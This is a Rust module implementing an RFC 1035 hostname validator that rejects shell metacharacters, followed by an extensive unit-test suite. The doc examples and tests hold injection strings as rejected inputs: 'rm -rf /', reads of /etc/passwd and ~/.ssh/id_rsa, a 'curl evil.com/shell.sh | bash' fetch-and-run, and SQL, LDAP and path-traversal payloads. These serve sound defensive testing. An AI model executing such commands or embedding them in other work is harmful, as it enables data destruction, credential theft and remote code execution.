//! Validated hostname type with RFC 1035 compliance.
//!
//! This module provides a `ValidatedHostname` newtype that ensures hostnames
//! comply with RFC 1035 and are safe from injection attacks.
//!
//! # Security Features
//!
//! - Maximum hostname length: 253 characters (RFC 1035)
//! - Maximum label length: 63 characters (RFC 1035)
//! - Only ASCII alphanumeric characters, hyphens, and dots allowed
//! - No shell metacharacters (`;`, `|`, `&`, `$`, `` ` ``, etc.)
//! - Normalized to lowercase for consistent comparison
//! - Labels cannot start or end with hyphens
//!
//! # Example
//!
//! ```
//! use tw_core::validation::ValidatedHostname;
//!
//! // Valid hostname
//! let hostname = ValidatedHostname::new("server-01.example.com").unwrap();
//! assert_eq!(hostname.as_str(), "server-01.example.com");
//!
//! // Invalid hostname (injection attempt)
//! assert!(ValidatedHostname::new("server; rm -rf /").is_err());
//! ```

use std::fmt;
use thiserror::Error;

/// Maximum length of a complete hostname (RFC 1035).
const MAX_HOSTNAME_LENGTH: usize = 253;

/// Maximum length of a hostname label (RFC 1035).
const MAX_LABEL_LENGTH: usize = 63;

/// Shell metacharacters that must be rejected to prevent command injection.
const SHELL_METACHARACTERS: &[char] = &[
    ';', '|', '&', '$', '`', '(', ')', '{', '}', '[', ']', '<', '>', '\'', '"', '\\', '!', '*',
    '?', '~', '#', '%', '^', '\n', '\r', '\t', '\0',
];

/// Errors that can occur when validating a hostname.
#[derive(Error, Debug, Clone, PartialEq, Eq)]
pub enum HostnameValidationError {
    /// The hostname is empty.
    #[error("hostname cannot be empty")]
    Empty,

    /// The hostname exceeds the maximum length (253 characters).
    #[error("hostname exceeds maximum length of {MAX_HOSTNAME_LENGTH} characters (got {0})")]
    TooLong(usize),

    /// A label within the hostname exceeds the maximum length (63 characters).
    #[error(
        "label '{label}' exceeds maximum length of {MAX_LABEL_LENGTH} characters (got {length})"
    )]
    LabelTooLong { label: String, length: usize },

    /// The hostname contains an empty label (consecutive dots or leading/trailing dot).
    #[error("hostname contains empty label (consecutive dots or leading/trailing dot)")]
    EmptyLabel,

    /// The hostname contains invalid characters.
    #[error("hostname contains invalid character: '{0}'")]
    InvalidCharacter(char),

    /// The hostname contains shell metacharacters (potential injection).
    #[error("hostname contains shell metacharacter '{0}' (potential injection attack)")]
    ShellMetacharacter(char),

    /// A label starts or ends with a hyphen.
    #[error("label '{0}' cannot start or end with a hyphen")]
    InvalidHyphenPosition(String),

    /// A label contains only digits (not allowed for the first label per some interpretations).
    #[error("hostname cannot consist of only numeric labels")]
    NumericOnly,
}

/// A validated hostname that complies with RFC 1035 and is safe from injection attacks.
///
/// This type guarantees that:
/// - The hostname is non-empty and at most 253 characters
/// - Each label is at most 63 characters
/// - Only ASCII alphanumeric characters, hyphens, and dots are present
/// - No shell metacharacters are present
/// - Labels don't start or end with hyphens
/// - The hostname is normalized to lowercase
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct ValidatedHostname(String);

impl ValidatedHostname {
    /// Creates a new validated hostname.
    ///
    /// The input is validated against RFC 1035 rules and checked for
    /// shell metacharacters. If valid, the hostname is normalized to lowercase.
    ///
    /// # Arguments
    ///
    /// * `hostname` - The hostname string to validate
    ///
    /// # Returns
    ///
    /// A `ValidatedHostname` if the input is valid, or a `HostnameValidationError`
    /// describing the validation failure.
    ///
    /// # Example
    ///
    /// ```
    /// use tw_core::validation::ValidatedHostname;
    ///
    /// let valid = ValidatedHostname::new("web-server.example.com");
    /// assert!(valid.is_ok());
    ///
    /// let invalid = ValidatedHostname::new("server; cat /etc/passwd");
    /// assert!(invalid.is_err());
    /// ```
    pub fn new(hostname: &str) -> Result<Self, HostnameValidationError> {
        // Check for empty hostname
        if hostname.is_empty() {
            return Err(HostnameValidationError::Empty);
        }

        // Check for shell metacharacters FIRST (security priority)
        for c in hostname.chars() {
            if SHELL_METACHARACTERS.contains(&c) {
                return Err(HostnameValidationError::ShellMetacharacter(c));
            }
        }

        // Check total length
        if hostname.len() > MAX_HOSTNAME_LENGTH {
            return Err(HostnameValidationError::TooLong(hostname.len()));
        }

        // Check for valid characters (ASCII alphanumeric, hyphen, dot)
        for c in hostname.chars() {
            if !c.is_ascii_alphanumeric() && c != '-' && c != '.' {
                return Err(HostnameValidationError::InvalidCharacter(c));
            }
        }

        // Validate labels
        let labels: Vec<&str> = hostname.split('.').collect();

        for label in &labels {
            // Check for empty labels (consecutive dots, leading/trailing dot)
            if label.is_empty() {
                return Err(HostnameValidationError::EmptyLabel);
            }

            // Check label length
            if label.len() > MAX_LABEL_LENGTH {
                return Err(HostnameValidationError::LabelTooLong {
                    label: label.to_string(),
                    length: label.len(),
                });
            }

            // Check that labels don't start or end with hyphen
            if label.starts_with('-') || label.ends_with('-') {
                return Err(HostnameValidationError::InvalidHyphenPosition(
                    label.to_string(),
                ));
            }
        }

        // Normalize to lowercase
        Ok(ValidatedHostname(hostname.to_lowercase()))
    }

    /// Returns the validated hostname as a string slice.
    pub fn as_str(&self) -> &str {
        &self.0
    }

    /// Consumes the `ValidatedHostname` and returns the inner `String`.
    pub fn into_inner(self) -> String {
        self.0
    }
}

impl fmt::Display for ValidatedHostname {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

impl AsRef<str> for ValidatedHostname {
    fn as_ref(&self) -> &str {
        &self.0
    }
}

impl std::ops::Deref for ValidatedHostname {
    type Target = str;

    fn deref(&self) -> &Self::Target {
        &self.0
    }
}

// Allow conversion from ValidatedHostname to String
impl From<ValidatedHostname> for String {
    fn from(hostname: ValidatedHostname) -> Self {
        hostname.0
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ========== Valid Hostname Tests ==========

    #[test]
    fn test_valid_simple_hostname() {
        let result = ValidatedHostname::new("server01");
        assert!(result.is_ok());
        assert_eq!(result.unwrap().as_str(), "server01");
    }

    #[test]
    fn test_valid_hostname_with_hyphens() {
        let result = ValidatedHostname::new("web-server-01");
        assert!(result.is_ok());
        assert_eq!(result.unwrap().as_str(), "web-server-01");
    }

    #[test]
    fn test_valid_fqdn() {
        let result = ValidatedHostname::new("server.example.com");
        assert!(result.is_ok());
        assert_eq!(result.unwrap().as_str(), "server.example.com");
    }

    #[test]
    fn test_valid_complex_fqdn() {
        let result = ValidatedHostname::new("prod-db-primary.us-west-2.internal.example.com");
        assert!(result.is_ok());
    }

    #[test]
    fn test_lowercase_normalization() {
        let result = ValidatedHostname::new("SERVER-01.EXAMPLE.COM");
        assert!(result.is_ok());
        assert_eq!(result.unwrap().as_str(), "server-01.example.com");
    }

    #[test]
    fn test_mixed_case_normalization() {
        let result = ValidatedHostname::new("WeB-SeRvEr.ExAmPlE.cOm");
        assert!(result.is_ok());
        assert_eq!(result.unwrap().as_str(), "web-server.example.com");
    }

    #[test]
    fn test_valid_numeric_label() {
        let result = ValidatedHostname::new("server01.123.example.com");
        assert!(result.is_ok());
    }

    #[test]
    fn test_single_character_hostname() {
        let result = ValidatedHostname::new("a");
        assert!(result.is_ok());
    }

    #[test]
    fn test_max_label_length() {
        // 63 character label (maximum allowed)
        let label = "a".repeat(63);
        let result = ValidatedHostname::new(&label);
        assert!(result.is_ok());
    }

    #[test]
    fn test_max_hostname_length() {
        // Create a hostname that's exactly 253 characters
        // Using labels like "a.a.a..." would work, but let's be precise
        let mut hostname = String::new();
        for i in 0..63 {
            if i > 0 {
                hostname.push('.');
            }
            hostname.push_str("aaa");
        }
        // Trim to exactly 253 characters if needed
        let hostname: String = hostname.chars().take(253).collect();
        // Ensure it doesn't end with a dot
        let hostname = hostname.trim_end_matches('.');
        assert!(hostname.len() <= 253);
        let result = ValidatedHostname::new(hostname);
        assert!(result.is_ok());
    }

    // ========== Empty and Length Tests ==========

    #[test]
    fn test_empty_hostname() {
        let result = ValidatedHostname::new("");
        assert!(matches!(result, Err(HostnameValidationError::Empty)));
    }

    #[test]
    fn test_hostname_too_long() {
        let hostname = "a".repeat(254);
        let result = ValidatedHostname::new(&hostname);
        assert!(matches!(result, Err(HostnameValidationError::TooLong(254))));
    }

    #[test]
    fn test_label_too_long() {
        let label = "a".repeat(64);
        let result = ValidatedHostname::new(&label);
        assert!(matches!(
            result,
            Err(HostnameValidationError::LabelTooLong { length: 64, .. })
        ));
    }

    #[test]
    fn test_empty_label_leading_dot() {
        let result = ValidatedHostname::new(".example.com");
        assert!(matches!(result, Err(HostnameValidationError::EmptyLabel)));
    }

    #[test]
    fn test_empty_label_trailing_dot() {
        let result = ValidatedHostname::new("example.com.");
        assert!(matches!(result, Err(HostnameValidationError::EmptyLabel)));
    }

    #[test]
    fn test_empty_label_consecutive_dots() {
        let result = ValidatedHostname::new("example..com");
        assert!(matches!(result, Err(HostnameValidationError::EmptyLabel)));
    }

    // ========== Invalid Character Tests ==========

    #[test]
    fn test_invalid_underscore() {
        let result = ValidatedHostname::new("server_01");
        assert!(matches!(
            result,
            Err(HostnameValidationError::InvalidCharacter('_'))
        ));
    }

    #[test]
    fn test_invalid_space() {
        let result = ValidatedHostname::new("server 01");
        assert!(matches!(
            result,
            Err(HostnameValidationError::InvalidCharacter(' '))
        ));
    }

    #[test]
    fn test_invalid_unicode() {
        let result = ValidatedHostname::new("server\u{00E9}");
        assert!(matches!(
            result,
            Err(HostnameValidationError::InvalidCharacter(_))
        ));
    }

    #[test]
    fn test_invalid_at_symbol() {
        let result = ValidatedHostname::new("user@server");
        assert!(matches!(
            result,
            Err(HostnameValidationError::InvalidCharacter('@'))
        ));
    }

    #[test]
    fn test_invalid_colon() {
        let result = ValidatedHostname::new("server:8080");
        assert!(matches!(
            result,
            Err(HostnameValidationError::InvalidCharacter(':'))
        ));
    }

    #[test]
    fn test_invalid_slash() {
        let result = ValidatedHostname::new("server/path");
        assert!(matches!(
            result,
            Err(HostnameValidationError::InvalidCharacter('/'))
        ));
    }

    // ========== Hyphen Position Tests ==========

    #[test]
    fn test_label_starts_with_hyphen() {
        let result = ValidatedHostname::new("-server");
        assert!(matches!(
            result,
            Err(HostnameValidationError::InvalidHyphenPosition(_))
        ));
    }

    #[test]
    fn test_label_ends_with_hyphen() {
        let result = ValidatedHostname::new("server-");
        assert!(matches!(
            result,
            Err(HostnameValidationError::InvalidHyphenPosition(_))
        ));
    }

    #[test]
    fn test_middle_label_starts_with_hyphen() {
        let result = ValidatedHostname::new("example.-server.com");
        assert!(matches!(
            result,
            Err(HostnameValidationError::InvalidHyphenPosition(_))
        ));
    }

    #[test]
    fn test_middle_label_ends_with_hyphen() {
        let result = ValidatedHostname::new("example.server-.com");
        assert!(matches!(
            result,
            Err(HostnameValidationError::InvalidHyphenPosition(_))
        ));
    }

    // ========== Shell Metacharacter Injection Tests ==========

    #[test]
    fn test_semicolon_injection() {
        let result = ValidatedHostname::new("server; rm -rf /");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter(';'))
        ));
    }

    #[test]
    fn test_pipe_injection() {
        let result = ValidatedHostname::new("server | cat /etc/passwd");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('|'))
        ));
    }

    #[test]
    fn test_ampersand_injection() {
        let result = ValidatedHostname::new("server && cat /etc/passwd");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('&'))
        ));
    }

    #[test]
    fn test_dollar_injection() {
        let result = ValidatedHostname::new("server$(cat /etc/passwd)");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('$'))
        ));
    }

    #[test]
    fn test_backtick_injection() {
        let result = ValidatedHostname::new("server`cat /etc/passwd`");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('`'))
        ));
    }

    #[test]
    fn test_parenthesis_injection() {
        let result = ValidatedHostname::new("server(");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('('))
        ));
    }

    #[test]
    fn test_brace_injection() {
        let result = ValidatedHostname::new("server{a,b}");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('{'))
        ));
    }

    #[test]
    fn test_bracket_injection() {
        let result = ValidatedHostname::new("server[0]");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('['))
        ));
    }

    #[test]
    fn test_redirect_injection() {
        let result = ValidatedHostname::new("server > /dev/null");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('>'))
        ));
    }

    #[test]
    fn test_redirect_input_injection() {
        let result = ValidatedHostname::new("server < /etc/passwd");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('<'))
        ));
    }

    #[test]
    fn test_single_quote_injection() {
        let result = ValidatedHostname::new("server'; cat /etc/passwd; echo '");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('\''))
        ));
    }

    #[test]
    fn test_double_quote_injection() {
        let result = ValidatedHostname::new("server\"; cat /etc/passwd; echo \"");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('"'))
        ));
    }

    #[test]
    fn test_backslash_injection() {
        let result = ValidatedHostname::new("server\\ninjected");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('\\'))
        ));
    }

    #[test]
    fn test_exclamation_injection() {
        let result = ValidatedHostname::new("server!!");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('!'))
        ));
    }

    #[test]
    fn test_glob_star_injection() {
        let result = ValidatedHostname::new("server*");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('*'))
        ));
    }

    #[test]
    fn test_glob_question_injection() {
        let result = ValidatedHostname::new("server?");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('?'))
        ));
    }

    #[test]
    fn test_tilde_injection() {
        let result = ValidatedHostname::new("~/.ssh/id_rsa");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('~'))
        ));
    }

    #[test]
    fn test_hash_injection() {
        let result = ValidatedHostname::new("server#comment");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('#'))
        ));
    }

    #[test]
    fn test_percent_injection() {
        let result = ValidatedHostname::new("server%20encoded");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('%'))
        ));
    }

    #[test]
    fn test_caret_injection() {
        let result = ValidatedHostname::new("server^modifier");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('^'))
        ));
    }

    #[test]
    fn test_newline_injection() {
        let result = ValidatedHostname::new("server\nrm -rf /");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('\n'))
        ));
    }

    #[test]
    fn test_carriage_return_injection() {
        let result = ValidatedHostname::new("server\rrm -rf /");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('\r'))
        ));
    }

    #[test]
    fn test_tab_injection() {
        let result = ValidatedHostname::new("server\tcommand");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('\t'))
        ));
    }

    #[test]
    fn test_null_byte_injection() {
        let result = ValidatedHostname::new("server\0injected");
        assert!(matches!(
            result,
            Err(HostnameValidationError::ShellMetacharacter('\0'))
        ));
    }

    // ========== Complex Injection Patterns ==========

    #[test]
    fn test_command_substitution_complex() {
        let result = ValidatedHostname::new("$(curl evil.com/shell.sh | bash)");
        assert!(result.is_err());
    }

    #[test]
    fn test_process_substitution() {
        let result = ValidatedHostname::new("<(cat /etc/passwd)");
        assert!(result.is_err());
    }

    #[test]
    fn test_sql_injection_attempt() {
        // SQL injection characters should also be caught
        let result = ValidatedHostname::new("server'; DROP TABLE users; --");
        assert!(result.is_err());
    }

    #[test]
    fn test_ldap_injection_attempt() {
        let result = ValidatedHostname::new("server)(uid=*)");
        assert!(result.is_err());
    }

    #[test]
    fn test_path_traversal_attempt() {
        let result = ValidatedHostname::new("../../../etc/passwd");
        assert!(result.is_err()); // Contains '/'
    }

    // ========== Display and Conversion Tests ==========

    #[test]
    fn test_display() {
        let hostname = ValidatedHostname::new("server-01.example.com").unwrap();
        assert_eq!(format!("{}", hostname), "server-01.example.com");
    }

    #[test]
    fn test_as_ref() {
        let hostname = ValidatedHostname::new("server-01").unwrap();
        let s: &str = hostname.as_ref();
        assert_eq!(s, "server-01");
    }

    #[test]
    fn test_deref() {
        let hostname = ValidatedHostname::new("server-01").unwrap();
        assert_eq!(&*hostname, "server-01");
    }

    #[test]
    fn test_into_string() {
        let hostname = ValidatedHostname::new("server-01").unwrap();
        let s: String = hostname.into();
        assert_eq!(s, "server-01");
    }

    #[test]
    fn test_equality() {
        let h1 = ValidatedHostname::new("server-01").unwrap();
        let h2 = ValidatedHostname::new("SERVER-01").unwrap();
        assert_eq!(h1, h2); // Both normalized to lowercase
    }

    #[test]
    fn test_clone() {
        let h1 = ValidatedHostname::new("server-01").unwrap();
        let h2 = h1.clone();
        assert_eq!(h1, h2);
    }

    #[test]
    fn test_hash() {
        use std::collections::HashSet;
        let mut set = HashSet::new();
        set.insert(ValidatedHostname::new("server-01").unwrap());
        set.insert(ValidatedHostname::new("SERVER-01").unwrap()); // Same after normalization
        assert_eq!(set.len(), 1);
    }

    // ========== Error Display Tests ==========

    #[test]
    fn test_error_display_empty() {
        let err = HostnameValidationError::Empty;
        assert_eq!(err.to_string(), "hostname cannot be empty");
    }

    #[test]
    fn test_error_display_too_long() {
        let err = HostnameValidationError::TooLong(300);
        assert!(err.to_string().contains("253"));
        assert!(err.to_string().contains("300"));
    }

    #[test]
    fn test_error_display_shell_metachar() {
        let err = HostnameValidationError::ShellMetacharacter(';');
        assert!(err.to_string().contains("injection"));
    }
}
